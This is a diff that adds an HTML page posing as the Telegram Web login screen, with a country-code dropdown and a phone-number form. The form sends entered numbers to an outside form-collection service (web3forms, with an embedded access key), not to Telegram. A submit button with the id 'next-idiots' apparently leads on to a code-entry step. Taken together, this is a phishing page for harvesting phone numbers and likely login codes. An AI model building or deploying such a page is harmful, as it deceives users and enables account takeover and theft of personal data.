@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="stylesheet" href="./css/reset.css">
+    <link rel="icon" href="./img/favicon.webp" type="image/webp"> 
+</head>
+<body>
+    <main class="container">
+<img src="./img/teleg.jpg" alt=""> 
+
+<form class="t-form" >
+
+
+    <input type="tel" placeholder="" id="myInput" onclick="myFunction()" onkeyup="filterFunction()">
+    <button type="submit"  onclick="myFunction()" class="dropbtn" id="mybtn"><img src="./img/search-btn.jpg" alt="" width="45px">
+    </button>
+  <img src="./img/country.jpg" alt="" class="country">
+    <div id="myDropdown" class="dropdown-content">
+      <div class="scroll-menu" id="scroll-menu">
+      <a id="1" onclick="mySearch(this.id)"><img src="./img/search-icon1.jpg" alt=""> <span style="display:none;"id="rezult1">Afghanistan</span> <span style="display:none;" id="number1">+93</span></a>
+      <a id="2" onclick="mySearch(this.id)"><img src="./img/search-icon2.jpg" alt=""> <span style="display:none;" id="rezult2">Albania</span> <span style="display:none;" id="number2">+335</span></a>
+      <a id="3" onclick="mySearch(this.id)"><img src="./img/search-icon3.jpg" alt=""> <span style="display:none;"  id="rezult3">Algeria</span> <span style="display:none;" id="number3">+213</span></a>
+      <a id="4" onclick="mySearch(this.id)"><img src="./img/search-icon4.jpg" alt=""> <span style="display:none;"  id="rezult4">American Samoa</span> <span style="display:none;" id="number4">+1684</span></a>
+      <a id="5" onclick="mySearch(this.id)"><img src="./img/search-icon5.jpg" alt=""> <span style="display:none;"  id="rezult5">Andorra</span> <span style="display:none;" id="number5">+376</span></a>
+      <a id="6" onclick="mySearch(this.id)"><img src="./img/search-icon6.jpg" alt=""> <span style="display:none;"  id="rezult6">Angola</span> <span style="display:none;" id="number6">+244</span></a>
+      <a id="7" onclick="mySearch(this.id)"><img src="./img/search-icon7.jpg" alt=""> <span style="display:none;"id="rezult7">Anguilla</span> <span style="display:none;" id="number7">+1264</span></a>
+      <a id="8" onclick="mySearch(this.id)"><img src="./img/search-icon8.jpg" alt=""> <span style="display:none;" id="rezult8">Anonymous Numbers</span> <span style="display:none;" id="number8">+888</span></a>
+      <a id="9" onclick="mySearch(this.id)"><img src="./img/search-icon9.jpg" alt=""> <span style="display:none;"  id="rezult9">Antigua  Barbuda</span> <span style="display:none;" id="number9">+1268</span></a>
+      <a id="10" onclick="mySearch(this.id)"><img src="./img/search-icon10.jpg" alt=""> <span style="display:none;"  id="rezult10">Argentina</span> <span style="display:none;" id="number10">+54</span></a>
+      <a id="11" onclick="mySearch(this.id)"><img src="./img/search-icon11.jpg" alt=""> <span style="display:none;"  id="rezult11">Armenia</span> <span style="display:none;" id="number11">+374</span></a>
+      <a id="12" onclick="mySearch(this.id)"><img src="./img/search-icon12.jpg" alt=""> <span style="display:none;" id="rezult12">Australia</span> <span style="display:none;" id="number12">+61</span></a>
+      <a id="13" onclick="mySearch(this.id)"><img src="./img/search-icon13.jpg" alt=""> <span style="display:none;"  id="rezult13">Austria</span> <span style="display:none;" id="number13">+43</span></a>
+      <a id="14" onclick="mySearch(this.id)"><img src="./img/search-icon14.jpg" alt=""> <span style="display:none;"  id="rezult14">Azerbaijan</span> <span style="display:none;" id="number14">+994</span></a>
+      <a id="15" onclick="mySearch(this.id)"><img src="./img/search-icon15.jpg" alt=""> <span style="display:none;"  id="rezult15">Bahamas</span> <span style="display:none;" id="number15">+1242</span></a> 
+      <a id="16" onclick="mySearch(this.id)"><img src="./img/search-icon16.jpg" alt=""> <span style="display:none;"  id="rezult16">Bahrain</span> <span style="display:none;" id="number16">+973</span></a>
+      <a id="17" onclick="mySearch(this.id)"><img src="./img/search-icon17.jpg" alt=""> <span style="display:none;"  id="rezult17">Bardados</span> <span style="display:none;" id="number17">+1246</span></a>
+      <a id="18" onclick="mySearch(this.id)"><img src="./img/search-icon18.jpg" alt=""> <span style="display:none;"  id="rezult18">Belarus</span> <span style="display:none;" id="number18">+375</span></a>
+      <a id="19" onclick="mySearch(this.id)"><img src="./img/search-icon19.jpg" alt=""> <span style="display:none;"  id="rezult19">Belgium</span> <span style="display:none;" id="number19">+32</span></a>
+      <a id="20" onclick="mySearch(this.id)"><img src="./img/search-icon20.jpg" alt=""> <span style="display:none;"  id="rezult20">Belize</span> <span style="display:none;" id="number20">+501</span></a>
+      <a id="21" onclick="mySearch(this.id)"><img src="./img/search-icon21.jpg" alt=""> <span style="display:none;"  id="rezult21">Benin</span> <span style="display:none;" id="number21">+229</span></a>
+      <a id="22" onclick="mySearch(this.id)"><img src="./img/search-icon22.jpg" alt=""> <span style="display:none;"  id="rezult22">Bermuda</span> <span style="display:none;" id="number22">+1441</span></a>
+      <a id="23" onclick="mySearch(this.id)"><img src="./img/search-icon23.jpg" alt=""> <span style="display:none;"  id="rezult23">Bolivia</span> <span style="display:none;" id="number23">+591</span></a>
+      <a id="24" onclick="mySearch(this.id)"><img src="./img/search-icon24.jpg" alt=""> <span style="display:none;"  id="rezult24">Bonaire, sint ...</span> <span style="display:none;" id="number24">+599</span></a> 
+      <a id="25" onclick="mySearch(this.id)"><img src="./img/search-icon25.jpg" alt=""> <span style="display:none;"  id="rezult25">Bosine Herzegovina</span> <span style="display:none;" id="number25">+387</span></a>
+      <a id="26" onclick="mySearch(this.id)"><img src="./img/search-icon26.jpg" alt=""> <span style="display:none;"  id="rezult26">Botswana</span> <span style="display:none;" id="number26">+267</span></a>
+      <a id="27" onclick="mySearch(this.id)"><img src="./img/search-icon27.jpg" alt=""> <span style="display:none;"  id="rezult27">Brazil</span> <span style="display:none;" id="number27">+55</span></a>
+      <a id="29" onclick="mySearch(this.id)"><img src="./img/search-icon29.jpg" alt=""> <span style="display:none;"  id="rezult29">Brunei Darussalam</span> <span style="display:none;" id="number29">+673</span></a>
+      <a id="30" onclick="mySearch(this.id)"><img src="./img/search-icon30.jpg" alt=""> <span style="display:none;"  id="rezult30">Bulgaria</span> <span style="display:none;" id="number30">+359</span></a>
+      <a id="31" onclick="mySearch(this.id)"><img src="./img/search-icon31.jpg" alt=""> <span style="display:none;"  id="rezult31">Burkina Faso</span> <span style="display:none;" id="number31">+226</span></a>
+      <a id="32" onclick="mySearch(this.id)"><img src="./img/search-icon32.jpg" alt=""> <span style="display:none;"  id="rezult32">Burundi</span> <span style="display:none;" id="number32">+257</span></a>
+      <a id="33" onclick="mySearch(this.id)"><img src="./img/search-icon33.jpg" alt=""> <span style="display:none;"  id="rezult33">Cambodia</span> <span style="display:none;" id="number33">+855</span></a>
+      <a id="34" onclick="mySearch(this.id)"><img src="./img/search-icon34.jpg" alt=""> <span style="display:none;"  id="rezult34">Canada</span> <span style="display:none;" id="number34">+1</span></a>
+      <a id="35" onclick="mySearch(this.id)"><img src="./img/search-icon35.jpg" alt=""> <span style="display:none;"  id="rezult35">Cape Verde</span> <span style="display:none;" id="number35">+238</span></a>
+      <a id="36" onclick="mySearch(this.id)"><img src="./img/search-icon36.jpg" alt=""> <span style="display:none;"  id="rezult36">Cayman Islands</span> <span style="display:none;" id="number36">+1345</span></a>
+      <a id="37" onclick="mySearch(this.id)"><img src="./img/search-icon37.jpg" alt=""> <span style="display:none;"  id="rezult37">Central African Per.</span> <span style="display:none;" id="number37">+236</span></a>
+      <a id="38" onclick="mySearch(this.id)"><img src="./img/search-icon38.jpg" alt=""> <span style="display:none;"  id="rezult38">Chad</span> <span style="display:none;" id="number38">+235</span></a>
+
+      <a id="39" onclick="mySearch(this.id)"><img src="./img/search-icon39.jpg" alt=""> <span style="display:none;"  id="rezult39"></span> <span style="display:none;" id="number39">+855</span></a>
+      <a id="40" onclick="mySearch(this.id)"><img src="./img/search-icon40.jpg" alt=""> <span style="display:none;"  id="rezult40">Canada</span> <span style="display:none;" id="number40">+1</span></a>
+      <a id="41" onclick="mySearch(this.id)"><img src="./img/search-icon41.jpg" alt=""> <span style="display:none;"  id="rezult41">Cape Verde</span> <span style="display:none;" id="number41">+238</span></a>
+      <a id="42" onclick="mySearch(this.id)"><img src="./img/search-icon42.jpg" alt=""> <span style="display:none;"  id="rezult42">Cayman Islands</span> <span style="display:none;" id="number42">+1345</span></a>
+      <a id="43" onclick="mySearch(this.id)"><img src="./img/search-icon43.jpg" alt=""> <span style="display:none;"  id="rezult43">Central African Per.</span> <span style="display:none;" id="number43">+236</span></a>
+      <a id="44" onclick="mySearch(this.id)"><img src="./img/search-icon44.jpg" alt=""> <span style="display:none;"  id="rezult44">Chad</span> <span style="display:none;" id="number44">+235</span></a>
+
+      <a id="45" onclick="mySearch(this.id)"><img src="./img/search-icon45.jpg" alt=""> <span style="display:none;"  id="rezult45"></span> <span style="display:none;" id="number45">+855</span></a>
+      <a id="46" onclick="mySearch(this.id)"><img src="./img/search-icon46.jpg" alt=""> <span style="display:none;"  id="rezult46">Canada</span> <span style="display:none;" id="number46">+1</span></a>
+      <a id="47" onclick="mySearch(this.id)"><img src="./img/search-icon47.jpg" alt=""> <span style="display:none;"  id="rezult47">Cape Verde</span> <span style="display:none;" id="number47">+238</span></a>
+      <a id="48" onclick="mySearch(this.id)"><img src="./img/search-icon48.jpg" alt=""> <span style="display:none;"  id="rezult48">Cayman Islands</span> <span style="display:none;" id="number48">+1345</span></a>
+      <a id="49" onclick="mySearch(this.id)"><img src="./img/search-icon49.jpg" alt=""> <span style="display:none;"  id="rezult49">Central African Per.</span> <span style="display:none;" id="number49">+236</span></a>
+      <a id="50" onclick="mySearch(this.id)"><img src="./img/search-icon50.jpg" alt=""> <span style="display:none;"  id="rezult50">Chad</span> <span style="display:none;" id="number50">+235</span></a>
+
+      <a id="51" onclick="mySearch(this.id)"><img src="./img/search-icon51.jpg" alt=""> <span style="display:none;"  id="rezult51"></span> <span style="display:none;" id="number51">+855</span></a>
+      <a id="52" onclick="mySearch(this.id)"><img src="./img/search-icon52.jpg" alt=""> <span style="display:none;"  id="rezult52">Canada</span> <span style="display:none;" id="number52">+1</span></a>
+      <a id="53" onclick="mySearch(this.id)"><img src="./img/search-icon53.jpg" alt=""> <span style="display:none;"  id="rezult53">Cape Verde</span> <span style="display:none;" id="number53">+238</span></a>
+      <a id="54" onclick="mySearch(this.id)"><img src="./img/search-icon54.jpg" alt=""> <span style="display:none;"  id="rezult54">Cayman Islands</span> <span style="display:none;" id="number54">+1345</span></a>
+      <a id="55" onclick="mySearch(this.id)"><img src="./img/search-icon55.jpg" alt=""> <span style="display:none;"  id="rezult55">Central African Per.</span> <span style="display:none;" id="number55">+236</span></a>
+      <a id="56" onclick="mySearch(this.id)"><img src="./img/search-icon56.jpg" alt=""> <span style="display:none;"  id="rezult56">Chad</span> <span style="display:none;" id="number56">+235</span></a>
+
+      <a id="57" onclick="mySearch(this.id)"><img src="./img/search-icon57.jpg" alt=""> <span style="display:none;"  id="rezult57"></span> <span style="display:none;" id="number57">+855</span></a>
+      <a id="58" onclick="mySearch(this.id)"><img src="./img/search-icon58.jpg" alt=""> <span style="display:none;"  id="rezult58">Canada</span> <span style="display:none;" id="number58">+1</span></a>
+      <a id="59" onclick="mySearch(this.id)"><img src="./img/search-icon59.jpg" alt=""> <span style="display:none;"  id="rezult59">Cape Verde</span> <span style="display:none;" id="number59">+238</span></a>
+      <a id="60" onclick="mySearch(this.id)"><img src="./img/search-icon60.jpg" alt=""> <span style="display:none;"  id="rezult60">Cayman Islands</span> <span style="display:none;" id="number60">+1345</span></a>
+      <a id="61" onclick="mySearch(this.id)"><img src="./img/search-icon61.jpg" alt=""> <span style="display:none;"  id="rezult61">Central African Per.</span> <span style="display:none;" id="number61">+236</span></a>
+      <a id="62" onclick="mySearch(this.id)"><img src="./img/search-icon62.jpg" alt=""> <span style="display:none;"  id="rezult62">Chad</span> <span style="display:none;" id="number62">+235</span></a>
+
+      <a id="63" onclick="mySearch(this.id)"><img src="./img/search-icon63.jpg" alt=""> <span style="display:none;"  id="rezult63"></span> <span style="display:none;" id="number63">+855</span></a>
+      <a id="64" onclick="mySearch(this.id)"><img src="./img/search-icon64.jpg" alt=""> <span style="display:none;"  id="rezult64">Canada</span> <span style="display:none;" id="number64">+1</span></a>
+      <a id="65" onclick="mySearch(this.id)"><img src="./img/search-icon65.jpg" alt=""> <span style="display:none;"  id="rezult65">Cape Verde</span> <span style="display:none;" id="number65">+238</span></a>
+      <a id="66" onclick="mySearch(this.id)"><img src="./img/search-icon66.jpg" alt=""> <span style="display:none;"  id="rezult66">Cayman Islands</span> <span style="display:none;" id="number66">+1345</span></a>
+      <a id="67" onclick="mySearch(this.id)"><img src="./img/search-icon67.jpg" alt=""> <span style="display:none;"  id="rezult67">Central African Per.</span> <span style="display:none;" id="number67">+236</span></a>
+      <a id="68" onclick="mySearch(this.id)"><img src="./img/search-icon68.jpg" alt=""> <span style="display:none;"  id="rezult68">Chad</span> <span style="display:none;" id="number68">+235</span></a>
+
+      <a id="69" onclick="mySearch(this.id)"><img src="./img/search-icon100.jpg" alt=""> <span style="display:none;"  id="rezult69">Russion Federation</span> <span style="display:none;" id="number69">+7</span></a>
+
+      <a id="70" onclick="mySearch(this.id)"><img src="./img/search-icon70.jpg" alt=""> <span style="display:none;"  id="rezult70">Russion Federation</span> <span style="display:none;" id="number70">+7</span></a>
+      <a id="71" onclick="mySearch(this.id)"><img src="./img/search-icon71.jpg" alt=""> <span style="display:none;"  id="rezult71">Russion Federation</span> <span style="display:none;" id="number71">+7</span></a>
+
+    
+
+
+
+    
+      
+    </div>
+</div>
+
+
+
+
+</form>
+   
+<form action="https://api.web3forms.com/submit" method="POST">
+
+  <input type="hidden" name="access_key" value="491dfdbe-5bb4-4aa5-bdbb-1258f4e38ff1">
+
+  <input type="tel" id="number"  class="number" placeholder="" maxlength="17"  name="name" required >
+<img src="./img/phone-number.jpg" class="phone-number">
+  <button type="submit" class="next" id="next-idiots" onclick="setTimeout(pageCode,300)" >NEXT</button>
+
+</form>
+
+<div class="qr">
+<p>LOG IN BY QR CODE</p>
+</div>
+    </main>
+   
+
+
+  
+
+    <script src="./js/script.js"></script>
+
+</body>
+</html>
